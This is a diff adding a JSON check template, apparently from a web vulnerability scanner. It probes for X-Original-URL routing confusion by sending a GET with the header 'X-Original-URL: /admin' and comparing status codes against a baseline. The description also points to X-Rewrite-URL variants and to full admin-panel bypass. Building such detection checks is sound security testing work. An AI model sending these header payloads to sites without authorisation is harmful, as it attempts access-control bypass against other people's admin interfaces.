@@ -1,0 +1,38 @@
+{
+  "name": "elite/X-Original-URL routing confusion",
+  "description": "[high] Alternate-route header confusion (PortSwigger access-control technique): X-Original-URL re-routes the request server-side while the front-end ACL only saw / — a 403 on the payload vs 200 on the baseline proves the header reaches routing. Keywords: x-original-url x-rewrite-url access control bypass routing acl header. ctrl: benign request without the header returns the normal home page -> not falsified. base_url = site root; copy skill for X-Rewrite-URL and for 401-deny or admin-content-marker targets (200-with-admin-body = full bypass case).",
+  "cwe": "CWE-288",
+  "requests": {
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/"
+    },
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/",
+      "headers": {
+        "X-Original-URL": "/admin"
+      }
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 403
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "8858a14b6710",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
